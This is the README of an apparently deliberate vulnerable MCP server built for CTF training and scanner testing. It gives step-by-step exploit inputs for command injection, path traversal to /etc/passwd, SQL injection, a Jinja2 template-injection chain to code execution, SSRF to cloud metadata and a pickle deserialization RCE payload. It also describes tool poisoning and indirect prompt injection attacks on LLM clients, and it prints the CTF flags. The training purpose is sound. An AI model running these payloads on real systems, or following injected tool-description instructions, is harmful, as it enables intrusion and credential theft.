# Vulnerable MCP Server

> **This server contains intentional security vulnerabilities. For security research and CTF training only. Do not deploy on public networks or production systems.**

A deliberately vulnerable [Model Context Protocol (MCP)](https://modelcontextprotocol.io) server that maps to real disclosed CVEs and published attack research. Built to be a meaningful test target for security scanners, red team exercises, and developer education.

---

## Table of Contents

- [Why This Exists](#why-this-exists)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Running the Server](#running-the-server)
  - [Option A — Claude Desktop (stdio)](#option-a--claude-desktop-stdio)
  - [Option B — HTTP+SSE (MCP Inspector / scanners)](#option-b--httpsse-mcp-inspector--scanners)
  - [Option C — Docker (recommended for full sandbox)](#option-c--docker-recommended-for-full-sandbox)
  - [Option D — Multi-Server Lab (Phase 2 attacks)](#option-d--multi-server-lab-phase-2-attacks)
- [Environment Variables](#environment-variables)
- [Challenges](#challenges)
  - [Beginner Tier](#beginner-tier)
  - [Intermediate Tier](#intermediate-tier)
  - [Advanced Tier](#advanced-tier)
  - [Phase 2 Roadmap](#phase-2-roadmap)
- [CTF System — How to Play](#ctf-system--how-to-play)
- [Example Exploits — Step by Step](#example-exploits--step-by-step)
- [Scanner Integration](#scanner-integration)
- [Agent Build System](#agent-build-system)
- [Sandbox vs Real Execution](#sandbox-vs-real-execution)
- [Project Structure](#project-structure)
- [Troubleshooting](#troubleshooting)
- [Research References](#research-references)
- [Legal](#legal)

---

## Why This Exists

As of early 2026:
- **36.7%** of public MCP servers have latent SSRF exposure ([Wiz](https://www.wiz.io))
- **23%** of scanned servers have command injection ([Invariant Labs](https://invariantlabs.ai))
- **84.2%** of tool poisoning attacks succeed with auto-approval enabled
- Multiple critical CVEs (CVSS 9.6) disclosed in widely deployed MCP packages

Existing training projects don't cover CVE-accurate scenarios, rug pull attacks, sampling abuse, or cross-server tool shadowing. This does.

---

## Prerequisites

| Requirement | Version | Notes |
|------------|---------|-------|
| Python | 3.11+ | 3.14 supported |
| pip | any | for package installation |
| Docker + Docker Compose | any | optional, recommended for isolation |
| Node.js + npx | any | optional, for MCP Inspector |

---

## Installation

### From Source

```bash
# Clone the repo
git clone https://github.com/beejak/Vulnerable-MCP-Server.git
cd Vulnerable-MCP-Server

# Install dependencies
pip install "mcp[cli]>=1.0.0" pyyaml jinja2 pydantic-settings httpx uvicorn

# Verify installation
MCP_TRAINING_MODE=true python server.py --help
```

### Using pyproject.toml

```bash
pip install -e .
```

---

## Running the Server

The server will **refuse to start** unless `MCP_TRAINING_MODE=true` is set. This is an intentional safety gate that acknowledges you understand this server is deliberately vulnerable.

### Option A — Claude Desktop (stdio)

Stdio transport connects the MCP server directly to Claude Desktop via standard I/O pipes. This is the easiest way to use the server interactively.

**Step 1 — Start the server manually to verify it works:**
```bash
MCP_TRAINING_MODE=true python server.py
```
You should see the startup banner and the server waiting on stdin.

**Step 2 — Add to Claude Desktop config:**

On macOS: `~/Library/Application Support/Claude/claude_desktop_config.json`
On Windows: `%APPDATA%\Claude\claude_desktop_config.json`

```json
{
  "mcpServers": {
    "vuln-training": {
      "command": "python",
      "args": ["/absolute/path/to/server.py"],
      "env": {
        "MCP_TRAINING_MODE": "true",
        "MCP_SANDBOX": "true",
        "MCP_DIFFICULTY": "all"
      }
    }
  }
}
```

**Step 3 — Restart Claude Desktop.** The server connects automatically. You'll see the tool count in the Claude Desktop toolbar (expect ~20 tools).

**Step 4 — Verify in Claude:**
```
list_challenges()
```
This should return all 12 challenges with their IDs, difficulty, and points.

**Difficulty filtering:** To focus on beginner challenges only:
```json
"env": { "MCP_TRAINING_MODE": "true", "MCP_DIFFICULTY": "beginner" }
```

---

### Option B — HTTP+SSE (MCP Inspector / scanners)

HTTP transport exposes the server on a TCP port, making it accessible to scanners, the MCP Inspector UI, and remote clients.

**Start the server in SSE mode:**
```bash
MCP_TRAINING_MODE=true MCP_TRANSPORT=sse MCP_PORT=8000 python server.py
```

Expected output:
```
[*] Starting Vulnerable MCP Server
[*] Transport: sse
[*] Difficulty: all
[*] Sandbox: True
[*] Listening on: http://0.0.0.0:8000
```

**Connect MCP Inspector:**
```bash
npx @modelcontextprotocol/inspector http://localhost:8000/sse
```
This opens a browser UI at `http://localhost:6274` where you can browse all tools and call them interactively — ideal for exploration.

**Connect programmatically (Python):**
```python
import asyncio
from mcp.client.sse import sse_client
from mcp import ClientSession

async def demo():
    async with sse_client("http://localhost:8000/sse") as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            tools = await session.list_tools()
            print([t.name for t in tools.tools])
            result = await session.call_tool("list_challenges", {})
            print(result.content[0].text)

asyncio.run(demo())
```

**Enable request tracing:**
```bash
MCP_TRAINING_MODE=true MCP_TRANSPORT=sse MCP_TRACE=true python server.py
# Full JSON-RPC messages written to traces/session_*.jsonl
```

---

### Option C — Docker (recommended for full sandbox)

Docker provides hard resource limits and isolates the server from your host system. Recommended for `MCP_SANDBOX=false` experiments and scanner testing.

**Start the full lab (server + attacker simulation server):**
```bash
docker compose up
```

This starts two containers:
- `vulnerable-mcp-server` on `http://localhost:8000/sse`
- `attacker-sim` on the internal `training-net` network (not exposed to host)

**Start with real execution enabled (advanced — Docker only):**
```bash
MCP_SANDBOX=false docker compose up
```

> When `MCP_SANDBOX=false`, `run_command()`, `fetch_url()`, and `create_report()` execute for real inside the container. The container has 1 CPU core and 512MB RAM limit enforced by Docker.

**Check server health:**
```bash
docker compose ps
docker compose logs vulnerable-mcp
```

**Connect from your host:**
```bash
npx @modelcontextprotocol/inspector http://localhost:8000/sse
```

**Rebuild after code changes:**
```bash
docker compose build --no-cache && docker compose up
```

**Shut down cleanly:**
```bash
docker compose down
```

**Access trace logs (when MCP_TRACE=true):**
```bash
# Traces are volume-mounted to ./traces/
ls traces/
cat traces/session_*.jsonl | python -m json.tool
```

---

### Option D — Multi-Server Lab (Phase 2 attacks)

The multi-server lab runs two MCP servers side-by-side — a trusted server and the vulnerable server — to demonstrate cross-server tool shadowing and cross-origin escalation attacks.

```bash
docker compose -f docker-compose.yml -f multi_server/docker-compose.multi.yml up
```

This starts:
- `trusted-server` at `http://localhost:9001/sse` — legitimate email/file tools
- `vulnerable-mcp` at `http://localhost:8000/sse` — malicious server with shadowing tool
- `attacker-server` at internal `:80` — serves adversarial prompt injection pages

Connect your MCP client to **both** servers simultaneously to trigger the shadowing demo.

---

## Environment Variables

All configuration is through environment variables. No config file required.

| Variable | Default | Required | Description |
|----------|---------|----------|-------------|
| `MCP_TRAINING_MODE` | `false` | **YES** | Must be `true` or server exits immediately |
| `MCP_SANDBOX` | `true` | No | `true` = simulate attacks, return flags safely. `false` = real execution (Docker only) |
| `MCP_TRANSPORT` | `stdio` | No | `stdio` for Claude Desktop; `sse` for HTTP; `streamable-http` for future clients |
| `MCP_DIFFICULTY` | `all` | No | `beginner`, `intermediate`, `advanced`, or `all` — filters which vulnerability modules load |
| `MCP_TRACE` | `false` | No | `true` = write full JSON-RPC trace to `traces/session_*.jsonl` |
| `MCP_HOST` | `0.0.0.0` | No | Bind address for HTTP transports |
| `MCP_PORT` | `8000` | No | Listen port for HTTP transports |
| `MCP_CTF_MODE` | `false` | No | `true` = persist challenge completion across sessions (not yet implemented) |

### Combining Variables

**Workshop / beginner-only mode:**
```bash
MCP_TRAINING_MODE=true MCP_DIFFICULTY=beginner MCP_TRANSPORT=sse python server.py
```

**Full debug mode:**
```bash
MCP_TRAINING_MODE=true MCP_TRANSPORT=sse MCP_TRACE=true MCP_SANDBOX=true python server.py
```

**CTF competition (Docker, real execution):**
```bash
MCP_TRAINING_MODE=true MCP_TRANSPORT=sse MCP_SANDBOX=false MCP_DIFFICULTY=all docker compose up
```

---

## Challenges

### Beginner Tier

These challenges require no prior MCP knowledge. They cover the most common and impactful vulnerability classes found in real-world MCP servers.

#### BEGINNER-001 — Tool Poisoning via Hidden Unicode Instructions
- **CWE:** CWE-116 | **CVSS:** 7.5 | **Points:** 100
- **Tools:** `analyze_code`, `security_scan`, `log_analytics`
- **What:** Tool descriptions contain adversarial instructions hidden using zero-width Unicode characters (U+200B, U+200C), HTML comments, and `[INST]` format injection. These are invisible to humans but processed by LLMs.
- **Goal:** Find all three hidden instruction techniques and retrieve the embedded flag.
- **Start here:** Call `list_challenges()` and `get_challenge_details("BEGINNER-001")` for full exploitation steps.

#### BEGINNER-002 — Command Injection via `shell=True`
- **CWE:** CWE-78 | **CVSS:** 9.8 | **Points:** 100
- **Tool:** `run_command`
- **CVE Class:** CVE-2025-6514
- **What:** `run_command` passes input directly to `subprocess.run(cmd, shell=True)` with no sanitization. Shell metacharacters like `;`, `&&`, `|`, and `$()` let you execute arbitrary commands.
- **Goal:** Use a command separator to read a file you shouldn't have access to.
- **Quick exploit:** `run_command("echo hello; whoami")`

#### BEGINNER-003 — Path Traversal via Unsanitized File Paths
- **CWE:** CWE-22 | **CVSS:** 7.5 | **Points:** 100
- **Tool:** `read_file`
- **CVE Class:** CVE-2025-68143
- **What:** `read_file` calls `open(path)` without normalizing the path or checking it against a base directory. `../` sequences escape the intended directory.
- **Goal:** Read a file outside the allowed directory using `../` traversal.
- **Quick exploit:** `read_file("../config.py")`

#### BEGINNER-004 — Indirect Prompt Injection via `fetch_url`
- **CWE:** CWE-77 | **CVSS:** 8.1 | **Points:** 150
- **Tool:** `fetch_url`
- **What:** `fetch_url` retrieves external URLs and returns raw content verbatim into the LLM's context. If the page contains LLM instructions, the model executes them.
- **Goal:** Fetch a URL containing adversarial instructions and observe the LLM following them.
- **Quick exploit:** `fetch_url("http://attacker.example.com/inject")`

---

### Intermediate Tier

These require understanding MCP session state, database interactions, and environment configuration.

#### INTERMEDIATE-001 — Authentication Bypass — Missing Authorization Check
- **CWE:** CWE-862 | **CVSS:** 8.8 | **Points:** 200
- **Tools:** `login`, `get_admin_config`, `whoami`
- **What:** `get_admin_config` has a `# TODO: check auth` comment where the authorization check should be. It was never implemented. Any caller gets admin config regardless of login state.
- **Goal:** Call `get_admin_config()` without authenticating and retrieve the admin flag.
- **Quick exploit:** `get_admin_config()` — no login required

#### INTERMEDIATE-002 — SQL Injection via f-string Formatting
- **CWE:** CWE-89 | **CVSS:** 9.1 | **Points:** 200
- **Tool:** `query_users`
- **What:** SQL query built as `f"SELECT * FROM users WHERE username = '{input}'"`. Single quotes and SQL keywords in input break out of the string context.
- **Goal:** Bypass the username filter and retrieve all users, including the admin row with the flag.
- **Quick exploit:** `query_users("' OR '1'='1")`

#### INTERMEDIATE-003 — Sensitive Data Exposure in Tool Descriptions
- **CWE:** CWE-312 | **CVSS:** 7.5 | **Points:** 200
- **Tools:** `send_ai_message`, `get_env_var`, `list_env_vars`
- **What:** API keys are hardcoded in the `send_ai_message` tool description. Any `tools/list` call delivers them to the LLM client. `list_env_vars` also dumps all environment variables.
- **Goal:** Find the API key embedded in a tool description and retrieve all environment variables.
- **Quick exploit:** Call `tools/list` and inspect `send_ai_message` description; call `list_env_vars()`

#### INTERMEDIATE-004 — State Manipulation — Missing Initialization Check
- **CWE:** CWE-372 | **CVSS:** 6.5 | **Points:** 150
- **Tools:** `initialize_server`, `reset_all_data`, `whoami`
- **What:** `reset_all_data` is documented as requiring prior `initialize_server()` call, but the `_initialized` flag is never checked. Destructive operations run without preconditions.
- **Goal:** Call `reset_all_data()` before `initialize_server()` and observe it succeeding.
- **Quick exploit:** `reset_all_data()` — no initialization needed

---

### Advanced Tier

These require deeper technical knowledge including network exploitation, template engine internals, deserialization, and resource exhaustion.

#### ADVANCED-001 — Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918 | **CVSS:** 8.6 | **Points:** 300
- **Tool:** `fetch_url`
- **CVE Class:** MarkItDown MCP SSRF (unpatched)
- **What:** `fetch_url` makes HTTP requests to any URL with no filtering of internal addresses. The server can be weaponized to probe internal services and cloud metadata endpoints.
- **Goal:** Use `fetch_url` to access an internal endpoint (localhost admin panel or cloud metadata service).
- **Quick exploit:** `fetch_url("http://169.254.169.254/latest/meta-data/")`

#### ADVANCED-002 — Server-Side Template Injection (SSTI)
- **CWE:** CWE-94 | **CVSS:** 9.0 | **Points:** 300
- **Tool:** `render_template`
- **What:** `render_template` uses `jinja2.Environment` (non-sandboxed). Jinja2 templates have access to Python internals through `__class__` and `__mro__`, enabling class hierarchy traversal to reach `subprocess.Popen`.
- **Goal:** Enumerate Python subclasses via template injection and demonstrate the path to RCE.
- **Quick exploit:** `render_template("{{ ''.__class__.__mro__[1].__subclasses__() }}")`

#### ADVANCED-003 — Denial of Service via Resource Exhaustion
- **CWE:** CWE-400 | **CVSS:** 7.5 | **Points:** 250
- **Tools:** `fibonacci`, `generate_permutations`, `flood_requests`
- **What:** No input bounds. `fibonacci(n)` uses O(2^n) recursion; `generate_permutations(s)` computes n! permutations; `flood_requests(n)` has no count cap.
- **Goal:** Demonstrate resource exhaustion using at least two tools.
- **Quick exploit:** `fibonacci(45)` or `generate_permutations("abcdefghijk")`

#### ADVANCED-004 — Insecure Deserialization (Pickle RCE)
- **CWE:** CWE-502 | **CVSS:** 9.8 | **Points:** 400
- **Tool:** `create_report`
- **What:** `create_report` calls `pickle.loads(base64.b64decode(data))` on user input. Python pickle's `__reduce__` method allows arbitrary code execution at deserialization time.
- **Goal:** Craft a pickle payload that executes a command on the server.
- **Payload:**
  ```python
  import pickle, base64, os
  class Exploit:
      def __reduce__(self):
          return (os.system, ('whoami',))
  payload = base64.b64encode(pickle.dumps(Exploit())).decode()
  # Then: create_report(payload)
  ```

---

### Phase 2 Roadmap

Planned challenges mapping to real CVEs (see [ROADMAP.md](docs/ROADMAP.md)):

| ID | Title | CVE |
|----|-------|-----|
| OAUTH-001 | OAuth `authorization_endpoint` injection | CVE-2025-6514 |
| OAUTH-002 | Session hijacking via OAuth state reuse | CVE-2025-6515 |
| GIT-001 | `--repository` flag path bypass | CVE-2025-68145 |
| GIT-002 | `git_init` targeting `~/.ssh` | CVE-2025-68143 |
| GIT-003 | `git_diff` argument injection | CVE-2025-68144 |
| RUG-001 | Dynamic tool definition mutation (rug pull) | Invariant Labs |
| SHADOW-001 | Cross-server email redirect (tool shadowing) | Invariant Labs |
| SAMPLE-001 | Server → client LLM manipulation (sampling abuse) | Unit42 |
| CI-001 | CI/CD poisoning via GitHub MCP | Community research |

---

## CTF System — How to Play

The server has a built-in CTF scoring system accessible via MCP tools.

### List All Challenges

```
list_challenges()
```

Returns a formatted list of all challenges, difficulty levels, point values, CWE IDs, and the tools involved.

### Get Challenge Details

```
get_challenge_details("BEGINNER-002")
```

Returns:
- Full description of the vulnerability
- Objective
- Step-by-step exploitation walkthrough
- Remediation guide (what the secure version looks like)

### Get Hints

Three levels of hints, from vague to near-solution:

```
get_hint("BEGINNER-002", 1)   # Conceptual hint
get_hint("BEGINNER-002", 2)   # Directional hint
get_hint("BEGINNER-002", 3)   # Near-solution hint
```

### Submit a Flag

When you successfully exploit a challenge, a flag in `FLAG{...}` format is returned. Submit it to verify:

```
submit_flag("BEGINNER-002", "FLAG{c0mm4nd_1nj3ct10n_sh3ll_tr00}")
```

Returns `CORRECT!` if the flag is right, or a hint message if not.

### Scoring

| Tier | Points per Challenge |
|------|---------------------|
| Beginner | 100–150 |
| Intermediate | 150–200 |
| Advanced | 250–400 |
| **Maximum total** | **2,450** |

---

## Example Exploits — Step by Step

### Command Injection (BEGINNER-002)

```
# Step 1: Verify basic functionality
run_command("echo hello")
# → Output: hello

# Step 2: Test injection with semicolon
run_command("echo hello; whoami")
# → Sandbox: returns FLAG{c0mm4nd_1nj3ct10n_sh3ll_tr00}
# → Real execution (MCP_SANDBOX=false): runs whoami on server

# Step 3: Submit the flag
submit_flag("BEGINNER-002", "FLAG{c0mm4nd_1nj3ct10n_sh3ll_tr00}")
# → CORRECT!
```

### Path Traversal (BEGINNER-003)

```
# Step 1: Normal read
read_file("README.md")
# → Returns README content

# Step 2: Traverse up
read_file("../config.py")
# → Returns config.py content (includes fake secrets)

# Step 3: Get all flags
read_file("../flags/flags.py")
# → Returns full flag registry

# Step 4: Classic Linux target
read_file("/etc/passwd")
# → Simulated passwd file (sandbox) or real file (MCP_SANDBOX=false in Docker)
```

### SQL Injection (INTERMEDIATE-002)

```
# Step 1: Normal query
query_users("alice")
# → Returns: {id: 1, username: alice, role: user}

# Step 2: Tautology — returns ALL rows
query_users("' OR '1'='1")
# → Returns: alice, bob, carol, admin (with flag in admin row)

# Step 3: Comment injection
query_users("admin' --")
# → Bypasses closing quote: SELECT * FROM users WHERE username = 'admin'--'

# Step 4: UNION injection
query_users("' UNION SELECT 1,'injected','admin','FLAG' --")
# → Injects a synthetic row into the result set
```

### Template Injection (ADVANCED-002)

```
# Step 1: Verify template execution
render_template("{{ 7 * 7 }}")
# → 49

# Step 2: Access Python internals
render_template("{{ ''.__class__ }}")
# → <class 'str'>

render_template("{{ ''.__class__.__mro__ }}")
# → (<class 'str'>, <class 'object'>)

# Step 3: Enumerate all subclasses (triggers flag)
render_template("{{ ''.__class__.__mro__[1].__subclasses__() }}")
# → [...<class 'subprocess.Popen'>...] + FLAG{t3mpl4t3_1nj3ct10n_3v4l}

# Step 4: Full RCE path (MCP_SANDBOX=false in Docker)
# Find subprocess.Popen index N in the subclass list, then:
render_template("{{ ''.__class__.__mro__[1].__subclasses__()[N](['id'], capture_output=True).stdout }}")
```

### SSRF (ADVANCED-001)

```
# Step 1: Internal admin panel
fetch_url("http://localhost/admin")
# → Simulated admin response

# Step 2: Cloud metadata (AWS EC2 simulation)
fetch_url("http://169.254.169.254/latest/meta-data/")
# → ami-id, instance-id, IAM credentials

# Step 3: Attacker server (when running docker compose)
fetch_url("http://attacker-server/meta")
# → FLAG{ssrf_1nt3rn4l_n3tw0rk} embedded in response
```

### Pickle RCE (ADVANCED-004)

```python
# Generate payload locally (Python)
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)  # Copy this string

# Then call in MCP:
# create_report("<paste payload here>")
# Sandbox: returns FLAG{p1ckl3_d3s3r14l1z4t10n_rce}
# Real (Docker, MCP_SANDBOX=false): executes id command on server
```

---

## Scanner Integration

This server is designed as a named test target for the major MCP security scanners.

### mcp-scan (Invariant Labs)

Detects tool poisoning, prompt injection, and cross-origin escalation.

```bash
pip install mcp-scan

# Scan against the running SSE server
mcp-scan http://localhost:8000/sse

# Scan a Claude Desktop config
mcp-scan --config ~/.config/Claude/claude_desktop_config.json
```

**Expected findings on this server:**
- Tool poisoning in `analyze_code` (hidden Unicode)
- Tool poisoning in `security_scan` (HTML comment injection)
- Prompt injection in `fetch_url` tool description
- Cross-origin escalation risk

### Cisco MCP Scanner

Uses YARA rules and LLM-as-judge to classify tool descriptions.

```bash
# See: https://github.com/cisco-ai-defense/mcp-scanner
python cisco_mcp_scanner.py --target http://localhost:8000/sse
```

### Proximity (open-source)

Risk-scores tools and resources.

```bash
# See: https://github.com/proximity-labs/proximity
proximity scan http://localhost:8000/sse
```

### Running All Scanners Against Docker

```bash
# Start server
docker compose up -d

# Run scanners
mcp-scan http://localhost:8000/sse
# ... etc

# Stop when done
docker compose down
```

---

## Agent Build System

The `agents/` directory contains a multi-agent system for extending this server with new vulnerability challenges. It uses the Claude API with tool use to automate coding, debugging, testing, and documentation.

### Prerequisites

```bash
pip install anthropic rich
export ANTHROPIC_API_KEY=your-api-key
```

### Run a Task with Live Dashboard

```bash
# Add a new vulnerability (orchestrates all agents automatically)
python agents/dashboard.py --run "Implement OAUTH-001 challenge per PRD.md"
```

The dashboard shows:
```
╔══════════════════════════════════════════════════════════════════╗
║  Vulnerable MCP Server — Agent Build System   [00:02:14]         ║
╠═════════════════╦════════════════════════════════════════════════╣
║  Agent Status   ║  Event Log                                     ║
║  ORCHESTRATOR ● ║  14:32:01  ORCHESTRATOR   STARTED              ║
║  CODING       ● ║  14:32:03  CODING         TOOL_CALL  write_f.. ║
║  DEBUGGING    ○ ║  14:32:05  CODING         COMPLETED            ║
║  TESTING      ● ║  14:32:06  TESTING        STARTED              ║
║  DOCS         ○ ║  14:32:08  TESTING        TOOL_CALL  run_exp.. ║
╠═════════════════╬════════════════════════════════════════════════╣
║  Token Usage    ║  Completed: 3    Queued: 4                     ║
║  Total: 8,432   ║  Last: Write vulnerabilities/oauth.py          ║
╚═════════════════╩════════════════════════════════════════════════╝
```

### Watch Mode (observe without running a task)

```bash
python agents/dashboard.py --watch
```

### Run Individual Agents

Each agent can be used independently:

```python
import asyncio
from agents.coding_agent import CodingAgent

async def main():
    bus = asyncio.Queue()
    agent = CodingAgent(bus, work_dir=".")
    result = await agent.run_task("Write a new vulnerability module for OAUTH-001")
    print(result.output)

asyncio.run(main())
```

### Agent Roles

| Agent | What It Does | When It Runs |
|-------|-------------|-------------|
| **Orchestrator** | Reads PRD/SCOPE, breaks task into subtasks, assigns to agents, retries on failure | Always (entry point) |
| **Coding Agent** | Writes Python vulnerability modules following `VulnerabilityModule` pattern | When new code is needed |
| **Debugging Agent** | Reads test failures, traces errors, applies minimal patches | When Testing Agent reports a failure |
| **Testing Agent** | Runs exploit scripts, verifies flags work, checks scanner output | After each code change |
| **Docs Agent** | Updates YAML challenge definitions, README tables, remediation guides | After code is verified |

---

## Sandbox vs Real Execution

Understanding the sandbox is critical before running commands.

### `MCP_SANDBOX=true` (default)

- `run_command("echo hello; whoami")` → detects `;`, returns `FLAG{...}` and an educational message. **No command runs on the host.**
- `read_file("../etc/passwd")` → detects traversal, returns simulated passwd content and the flag.
- `create_report(pickle_payload)` → detects pickle, returns flag without deserializing.
- `fetch_url("http://169.254.169.254/...")` → returns pre-loaded simulated metadata, no real HTTP request.
- `fibonacci(50)` → detects large input, returns flag, no computation.

### `MCP_SANDBOX=false` (Docker-isolated only)

- `run_command("echo hello; whoami")` → executes on the container, returns real output.
- `read_file("../etc/passwd")` → reads the actual container `/etc/passwd`.
- `create_report(pickle_payload)` → deserializes and executes. The container has 1 CPU / 512MB RAM limit.
- `fetch_url("http://169.254.169.254/...")` → makes a real HTTP request (Docker provides a real 169.254.169.254 endpoint for EC2 demo).
- `fibonacci(50)` → will exhaust CPU within the container's limits.

> **Never run `MCP_SANDBOX=false` outside of Docker.** The resource limits in `docker-compose.yml` are what make it safe.

---

## Project Structure

```
├── server.py                  # Entry point — FastMCP init, module registration, CTF tools
├── config.py                  # Safety gate, env var config, fake secrets registry
├── pyproject.toml             # Python dependencies
├── Dockerfile                 # Container build (Python 3.11-slim, non-root user)
├── docker-compose.yml         # Full lab: vulnerable server + attacker simulation server
│
├── flags/
│   ├── __init__.py
│   └── flags.py               # FLAG{...} registry — get_flag(), check_flag()
│
├── vulnerabilities/           # One module per attack category
│   ├── base.py                # Abstract VulnerabilityModule base class
│   ├── __init__.py            # ALL_MODULES list — controls what loads
│   ├── tool_poisoning.py      # BEGINNER-001: Unicode/HTML/INST injection in descriptions
│   ├── injection.py           # BEGINNER-002/003, INTERMEDIATE-002, ADVANCED-002/004
│   ├── auth.py                # INTERMEDIATE-001/004: missing auth checks
│   ├── exfiltration.py        # INTERMEDIATE-003: secrets in descriptions, env var dump
│   ├── prompt_injection.py    # BEGINNER-004, ADVANCED-001: fetch_url SSRF/injection
│   └── dos.py                 # ADVANCED-003: fibonacci, permutations, flood
│
├── resources/
│   ├── __init__.py
│   └── sensitive.py           # MCP resources: secret://api-keys, config://server, etc.
│
├── challenges/                # YAML definitions for each challenge
│   ├── beginner.yaml          # BEGINNER-001 through BEGINNER-004
│   ├── intermediate.yaml      # INTERMEDIATE-001 through INTERMEDIATE-004
│   └── advanced.yaml          # ADVANCED-001 through ADVANCED-004
│
├── agents/                    # Multi-agent build system (Claude API)
│   ├── base_agent.py          # BaseAgent with agentic loop, retry, event emission
│   ├── orchestrator.py        # Task decomposition and subtask routing
│   ├── coding_agent.py        # Writes vulnerability modules
│   ├── debugging_agent.py     # Diagnoses and patches test failures
│   ├── testing_agent.py       # Runs exploits, verifies flags, runs scanners
│   ├── docs_agent.py          # Updates YAML, README, remediation guides
│   └── dashboard.py           # Real-time Rich TUI dashboard
│
├── docs/
│   ├── USAGE.md               # This guide — detailed how-to for every feature
│   ├── ROADMAP.md             # Gap analysis, CVE table, phase milestones
│   ├── PRD.md                 # Product requirements and acceptance criteria
│   ├── SCOPE.md               # In/out of scope, priority matrix
│   ├── SYSTEM_DESIGN.md       # Server + agent system design with code patterns
│   ├── ARCHITECTURE.md        # ASCII diagrams: network, Docker, agent system
│   └── THREAT_MODEL.md        # CVE-based threat model, STRIDE analysis
│
└── .claude/
    └── launch.json            # Dev server launch configurations
```

---

## Troubleshooting

### Server won't start

**Error:** `ERROR: This server requires MCP_TRAINING_MODE=true to start.`

**Fix:**
```bash
export MCP_TRAINING_MODE=true
python server.py
```

---

### Port already in use

**Error:** `[Errno 98] Address already in use`

**Fix:**
```bash
# Find what's on port 8000
lsof -i :8000      # macOS/Linux
netstat -ano | findstr :8000  # Windows

# Use a different port
MCP_TRAINING_MODE=true MCP_TRANSPORT=sse MCP_PORT=8001 python server.py
```

---

### Claude Desktop doesn't show tools

1. Verify the path in `claude_desktop_config.json` is absolute and correct
2. Check the server starts manually: `MCP_TRAINING_MODE=true python /path/to/server.py`
3. Check Claude Desktop logs: `~/Library/Logs/Claude/` (macOS)
4. Restart Claude Desktop completely (quit from menu bar, not just close window)

---

### Docker container exits immediately

```bash
# Check logs
docker compose logs vulnerable-mcp

# Most likely cause: missing env var
# Verify docker-compose.yml has MCP_TRAINING_MODE: "true"
```

---

### Exploits return "simulated" instead of real output

You're in sandbox mode (default). This is correct behavior. If you want real execution:
1. Ensure you're running in Docker (`docker compose up`)
2. Set `MCP_SANDBOX=false` in docker-compose.yml or via env var
3. Understand the risks — real commands will execute inside the container

---

### mcp-scan finds no vulnerabilities

Ensure the server is running in SSE mode and accessible:
```bash
curl http://localhost:8000/sse   # Should return SSE stream headers
mcp-scan http://localhost:8000/sse --verbose
```

---

### Import errors on startup

```bash
# Install all dependencies
pip install "mcp[cli]>=1.0.0" pyyaml jinja2 pydantic-settings httpx uvicorn

# Verify
python -c "import mcp, yaml, jinja2, pydantic_settings, httpx, uvicorn; print('OK')"
```

---

## Research References

- [CVE-2025-6514 — mcp-remote RCE (CVSS 9.6)](https://research.jfrog.com/vulnerabilities/mcp-remote-command-injection-rce-jfsa-2025-001290844/)
- [CVE-2025-68145/43/44 — Anthropic Git MCP RCE chain](https://thehackernews.com/2026/01/three-flaws-in-anthropic-mcp-git-server.html)
- [Tool Poisoning Attacks — Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
- [MCP Sampling Attack Vectors — Palo Alto Unit42](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)
- [VulnerableMCP Database](https://vulnerablemcp.info/)
- [Systematic Analysis of MCP Security — arxiv 2508.12538](https://arxiv.org/html/2508.12538v1)
- [ETDI: Mitigating Rug Pull Attacks — arxiv 2506.01333](https://arxiv.org/abs/2506.01333v1)
- [Indirect Prompt Injection — arxiv 2302.12173](https://arxiv.org/abs/2302.12173)
- [Awesome MCP Security — Puliczek](https://github.com/Puliczek/awesome-mcp-security)
- [MCP Security Checklist — SlowMist](https://github.com/slowmist/MCP-Security-Checklist)

---

## Legal

All credentials are fake training values. All flags are CTF strings with no real system impact. Set `MCP_TRAINING_MODE=true` to acknowledge this is a training server.

MIT License.
